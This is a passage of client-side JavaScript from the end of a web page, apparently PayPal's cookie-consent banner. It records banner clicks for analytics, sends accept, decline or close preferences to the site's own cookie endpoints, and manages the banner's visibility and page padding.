                    e: 'cl',
                    link: cookiesText,
                    pglk: trackingPageName + '|' + cookiesText,
                    pgln: trackingPageName + '|' + cookiesText,
                    c_prefs: cookiePrefs,
                    opsel: cookiePrefs + ',VN',
                    csource: 'cookie',
                    event_name: eventName
                };
                for (var key in bannerFptiData) {
                    bannerData[key] = bannerFptiData[key];
                };
                fptiRecordClick(bannerData);
                var winFptiData = JSON.parse(JSON.stringify((window && window.fpti) || {}));
                var updatedFptiData = {
                    cookiebannerhidden: 'true',
                    c_prefs: cookiePrefs
                };
                for (var key in bannerFptiData) {
                    updatedFptiData[key] = bannerFptiData[key];
                };
                for (var key in updatedFptiData) {
                    winFptiData[key] = updatedFptiData[key];
                };
                window.PAYPAL.analytics.Analytics.prototype.logActivity(winFptiData);
            };

            function cookieObjSetup(type) {
                const cookieObjValue = {
                    "accept": {
                        endPointSuffix: '&type=explicit_banner&country=VN&policy=ccpa&version=v6',
                        endPointPrefix: 'https://www.paypal.com/myaccount/privacy/cookiePrefs/accept?marketing=true&performance=true&functional=true',
                        eventSource: 'acceptCookieBanner',
                        cookiesText: 'acceptcookies',
                        cookiePrefs: 'T=1,P=1,F=1,type=explicit_banner',
                        eventName: 'cookie_banner_accept_clicked'
                    },
                    "decline": {
                        endPointSuffix: '&type=explicit_banner&country=VN&policy=ccpa&version=v6',
                        endPointPrefix: 'https://www.paypal.com/myaccount/privacy/cookiePrefs/accept?marketing=false&performance=true&functional=true',
                        eventSource: 'declineCookieBanner',
                        cookiesText: 'declinecookies',
                        cookiePrefs: 'T=0,P=1,F=1,type=explicit_banner',
                        eventName: 'cookie_banner_decline_clicked'
                    },
                    "close": {
                        endPointSuffix: '&type=explicit_close&country=VN&policy=ccpa&version=v6',
                        endPointPrefix: 'https://www.paypal.com/myaccount/privacy/cookiePrefs/accept?marketing=true&performance=true&functional=true',
                        eventSource: 'closeCookieBanner',
                        cookiesText: 'closecookies',
                        cookiePrefs: 'T=1,P=1,F=1,type=explicit_close',
                        eventName: 'cookie_banner_close_clicked'
                    }
                };
                return cookieObjValue[type];
            }

            function bindGdprEvents() {
                var acceptAllButton = document.getElementById('acceptAllButton');
                var bannerDeclineButton = document.getElementById('bannerDeclineButton');
                var bannerCloseButton = document.getElementById('bannerCloseButton');
                var usBannerCloseButton = document.getElementById('usBannerCloseButton');
                var manageCookiesLink = document.getElementById('manageCookiesLink');
                var cookieStatement = document.getElementById('cookieStatement');
                var cookieLanguage = document.getElementById('ccpaCookieContent_wrapper');
                var cookieBanner = document.getElementById('ccpaCookieBanner');
                var cookieBannerAcceptAll = document.getElementsByClassName("ccpaCookieBanner-acceptedAll");
                var trackingPageName = '' || getFptiPage() || document.title;
                if (manageCookiesLink) {
                    manageCookiesLink.onclick = function() {
                        var manageCookiesData = {
                            e: 'cl',
                            link: 'managecookies',
                            pglk: trackingPageName + '|managecookies',
                            pgln: trackingPageName + '|managecookies',
                            event_name: 'cookie_banner_manage_cookies_clicked'
                        };
                        for (var key in bannerFptiData) {
                            manageCookiesData[key] = bannerFptiData[key];
                        };
                        fptiRecordClick(manageCookiesData);
                    };
                }
                if (cookieStatement) {
                    cookieStatement.onclick = function() {
                        var cookieStatementData = {
                            e: 'cl',
                            link: 'cookieStmtLink',
                            pglk: trackingPageName + '|cookieStmtLink',
                            pgln: trackingPageName + '|cookieStmtLink',
                            event_name: 'cookie_banner_cookie_statement_clicked'
                        };
                        for (var key in bannerFptiData) {
                            cookieStatementData[key] = bannerFptiData[key];
                        };
                        fptiRecordClick(cookieStatementData);
                    };
                }
                if (bannerCloseButton && cookieBanner && cookieLanguage) {
                    bannerCloseButton.onclick = function() {
                        hideBanner();
                        setSessionStorage('isBannerClosed');
                        var closebannerFptiData = {
                            e: 'cl',
                            link: 'closeBanner',
                            pglk: trackingPageName + '|closeBanner',
                            pgln: trackingPageName + '|closeBanner',
                            event_name: 'cookie_banner_close_clicked'
                        };
                        for (var key in bannerFptiData) {
                            closebannerFptiData[key] = bannerFptiData[key];
                        };
                        fptiRecordClick(closebannerFptiData);
                    };
                }
                if (acceptAllButton && cookieBanner && cookieLanguage) {
                    acceptAllButton.onclick = function() {
                        hideBanner();
                        if (false) {
                            setSessionStorage('isUserAccepted');
                        }
                        postAjax(true, cookieObjSetup('accept'));
                    };
                }
                if (bannerDeclineButton && cookieBanner && cookieLanguage) {
                    bannerDeclineButton.onclick = function() {
                        hideBanner();
                        if (false) {
                            setSessionStorage('isUserAccepted');
                        }
                        postAjax(true, cookieObjSetup('decline'));
                    };
                }
                if (usBannerCloseButton && cookieBanner && cookieLanguage) {
                    usBannerCloseButton.onclick = function() {
                        hideBanner();
                        if (false) {
                            setSessionStorage('isUserAccepted');
                        }
                        postAjax(true, cookieObjSetup('close'));
                    };
                }
                window.hideGdprBanner = function() {
                    var cookieBannerUi = document.getElementById('ccpaCookieBanner');
                    if (cookieBannerUi && cookieBannerUi.className.indexOf('ccpaHideCookieBannerMobile') === -1) {
                        cookieBannerUi.className += " ccpaHideCookieBannerMobile";
                    }
                };
                window.showGdprBanner = function() {
                    var cookieBannerUi = document.getElementById('ccpaCookieBanner');
                    if (cookieBannerUi) {
                        cookieBannerUi.className = cookieBannerUi.className.replace("ccpaHideCookieBannerMobile", "");
                    }
                };
                document.body.addEventListener("focus", function(event) {
                    if (event.target.type === 'text' || event.target.type === 'number' || event.target.type === 'password' || event.target.type === 'email' || event.target.type === 'select-one') {
                        window.hideGdprBanner();
                    }
                }, true);
            }

            function adjustPaddingTop() {
                var cookieBannerAcceptAll = document.getElementsByClassName("ccpaCookieBanner-acceptedAll");
                if (cookieBannerAcceptAll.length > 0) {
                    var cookieBanner = document.getElementById('ccpaCookieBanner');
                    var bannerHeight = cookieBanner ? cookieBanner.clientHeight : 0;
                    if (cookieBannerAcceptAll && cookieBannerAcceptAll[0] && bannerHeight) {
                        cookieBannerAcceptAll[0].style.paddingTop = bannerHeight / 16 + 'em';
                    }
                }
            };
            var isPaddingBottomAdded = false,
                bannerPaddingBottom = "";

            function adjustPaddingBottom(addListener) {
                if (undefined || !false) {
                    return;
                }

                function adjustPaddingBottomEvent() {
                    var cookieBannerAcceptAll = document.getElementsByClassName("ccpaCookieBanner-acceptedAll");
                    if (cookieBannerAcceptAll.length > 0) {
                        var bodyPaddingBottom = cookieBannerAcceptAll[0].style.paddingBottom;
                        var cookieBanner = document.getElementById('ccpaCookieBanner');
                        if (cookieBannerAcceptAll && cookieBannerAcceptAll[0] && cookieBanner.style.display != 'none') {
                            if (bodyPaddingBottom === "" || (isPaddingBottomAdded && bannerPaddingBottom === bodyPaddingBottom)) {
                                var cookieBannerContainer = document.getElementsByClassName('ccpaCookieBanner_container');
                                var bannerBottomHeight = cookieBannerContainer.length > 0 ? parseInt(window.getComputedStyle(cookieBannerContainer[0]).bottom.replace("px", "")) : 0;
                                var bannerHeight = cookieBanner ? cookieBanner.clientHeight : 0;
                                bannerPaddingBottom = ((bannerHeight + bannerBottomHeight) / 16) + 'em';
                                cookieBannerAcceptAll[0].style.paddingBottom = bannerPaddingBottom;
                                isPaddingBottomAdded = true;
                            } else if (isPaddingBottomAdded && bannerPaddingBottom !== bodyPaddingBottom) {
                                isPaddingBottomAdded = false;
                            }
                        }
                    }
                }
                if (addListener) {
                    adjustPaddingBottomEvent();
                    window.addEventListener('resize', adjustPaddingBottomEvent);
                } else {
                    var cookieBannerAcceptAll = document.getElementsByClassName("ccpaCookieBanner-acceptedAll");
                    if (cookieBannerAcceptAll && cookieBannerAcceptAll[0]) {
                        window.removeEventListener('resize', adjustPaddingBottomEvent);
                        adjustPaddingBottomEvent();
                        if (isPaddingBottomAdded && cookieBannerAcceptAll[0].style.paddingBottom === bannerPaddingBottom) {
                            cookieBannerAcceptAll[0].style.removeProperty('padding-bottom');
                        }
                    }
                }
            };
            window.bindGdprEvents = bindGdprEvents;

            function cookieDisabled() {
                if (navigator.cookieEnabled === false) return "true";
                else if (navigator.cookieEnabled === true) return "false";
                else return "undefined";
            };

            function fptiLogActivity(winFptiData) {
                window.PAYPAL.analytics.Analytics.prototype.logActivity({...winFptiData, product: "cookieBanner"
                });
            };

            function gdprSetup() {
                var cookieLanguage = document.getElementById('ccpaCookieContent_wrapper');
                var cookieBanner = document.getElementById('ccpaCookieBanner');
                var manageLink = document.getElementById('manageCookiesLink');
                var acceptAllLink = document.getElementById('acceptAllButton');
                var trackingPageName = '' || getFptiPage() || document.title;
                if (!isBannerClosed()) {
                    document.body.className = document.body.className += " ccpaCookieBanner-acceptedAll";
                    if (undefined) {
                        adjustPaddingTop();
                        window.addEventListener('resize', adjustPaddingTop);
                        document.body.className = document.body.className += " top-cookie-banner-enabled";
                    }
                    enableEvents(true);
                }
                var pageName = trackingPageName || getFptiPage() || document.title;
                var winFptiData = JSON.parse(JSON.stringify((window && window.fpti) || {}));
                if (false) {
                    bannerFptiData.isNativeBannerHidden = true;
                }
                for (var key in bannerFptiData) {
                    winFptiData[key] = bannerFptiData[key];
                };
                winFptiData['event_name'] = 'cookie_banner_shown';
                fptiLogActivity(winFptiData);
                if (manageLink) {
                    manageLink.setAttribute('pagename', (pageName + '|managecookies'));
                }
                if (acceptAllLink) {
                    acceptAllLink.setAttribute('pagename', (pageName + '|acceptcookies'));
                }
                bindGdprEvents();
            };

            function hideBanner() {
                var cookieLanguage = document.getElementById('ccpaCookieContent_wrapper');
                var cookieBanner = document.getElementById('ccpaCookieBanner');
                if (cookieLanguage && cookieBanner) {
                    cookieLanguage.style.display = 'none';
                    cookieBanner.style.display = 'none';
                } else {
                    return false;
                }
                window.removeEventListener('resize', adjustPaddingTop);
                var cookieBannerAcceptAll = document.getElementsByClassName("ccpaCookieBanner-acceptedAll");
                if (cookieBannerAcceptAll && cookieBannerAcceptAll[0]) {
                    cookieBannerAcceptAll[0].style.removeProperty('padding-top');
                }
                enableEvents(false);
                document.body.className = document.body.className.replace("ccpaCookieBanner-acceptedAll", "");
                document.body.className = document.body.className.replace("top-cookie-banner-enabled", "");
                return true;
            }

            function isPageReady() {
                var cookieBannerUi = document.getElementById('ccpaCookieBanner');
                return !!(cookieBannerUi && getFptiReqData());
            }

            function enableFocusEvent(addListener) {
                if (!false || undefined) {
                    return;
                }
                var cookieBanner = document.getElementById('ccpaCookieBanner');

                function focusIn(e) {
                    if (cookieBanner && cookieBanner.style.display != 'none') {
                        var activeElement = document.activeElement;
                        if (((activeElement.getBoundingClientRect().bottom) > (cookieBanner.getBoundingClientRect().top)) && !activeElement.parentElement.nodeName.includes("UL")) {
                            activeElement.scrollIntoView({
                                block: 'center'
                            });
                        }
                    } else {
                        document.removeEventListener("focusin", focusIn);
                    }
                }
                if (addListener) {
                    document.addEventListener("focusin", focusIn);
                }
            }

            function enableEvents(enable) {
                adjustPaddingBottom(enable);
                enableFocusEvent(enable);
            }
            var maxRetries = 34,
                bannerhidden = false;

            function triggerBanner() {
                if (isPageReady()) {
                    cookieFiltering('pageLoad');
                    if (true) {
                        setTimeout(function() {
                            cookieFiltering('afterPageLoad')
                        }, 3000);
                    }
                    if (isBannerClosed()) {
                        hideBanner();
                    }
                    if (true) {
                        setSessionStorage('isInvisibleBanner');
                    }
                    gdprSetup();
                } else {
                    if (isBannerClosed() && !bannerhidden) {
                        bannerhidden = hideBanner();
                    }
                    if (maxRetries-- > 0) {
                        setTimeout(triggerBanner, 150);
                    } else {
                        cookieFiltering('pageLoad');
                        if (true) {
                            setTimeout(function() {
                                cookieFiltering('afterPageLoad')
                            }, 3000);
                        }
                        if (isBannerClosed()) {
                            hideBanner();
                        }
                        if (!isBannerClosed() && document.getElementById('ccpaCookieBanner') && !document.body.className.includes("ccpaCookieBanner-acceptedAll")) {
                            document.body.className = document.body.className += " ccpaCookieBanner-acceptedAll";
                            if (undefined) {
                                adjustPaddingTop();
                                window.addEventListener('resize', adjustPaddingTop);
                                document.body.className = document.body.className += " top-cookie-banner-enabled";
                            }
                            enableEvents(true);
                        }
                        var acceptAllButton = document.getElementById('acceptAllButton');
                        var bannerDeclineButton = document.getElementById('bannerDeclineButton');
                        var bannerCloseButton = document.getElementById('bannerCloseButton');
                        var usBannerCloseButton = document.getElementById('usBannerCloseButton');
                        var cookieBanner = document.getElementById('ccpaCookieBanner');
                        if (acceptAllButton) {
                            acceptAllButton.onclick = function() {
                                hideBanner();
                                if (false) {
                                    setSessionStorage('isUserAccepted');
                                }
                                postAjax(false, cookieObjSetup('accept'));
                            };
                        }
                        if (bannerDeclineButton) {
                            bannerDeclineButton.onclick = function() {
                                hideBanner();
                                if (false) {
                                    setSessionStorage('isUserAccepted');
                                }
                                postAjax(false, cookieObjSetup('decline'));
                            };
                        }
                        if (usBannerCloseButton) {
                            usBannerCloseButton.onclick = function() {
                                hideBanner();
                                if (false) {
                                    setSessionStorage('isUserAccepted');
                                }
                                postAjax(false, cookieObjSetup('close'));
                            };
                        }
                        if (bannerCloseButton) {
                            bannerCloseButton.onclick = function() {
                                hideBanner();
                                setSessionStorage('isBannerClosed');
                            }
                        }
                        if (true) {
                            setSessionStorage('isInvisibleBanner');
                        }
                    }
                }
            }
            triggerBanner();
        })();
    </script>

</body>

</html>

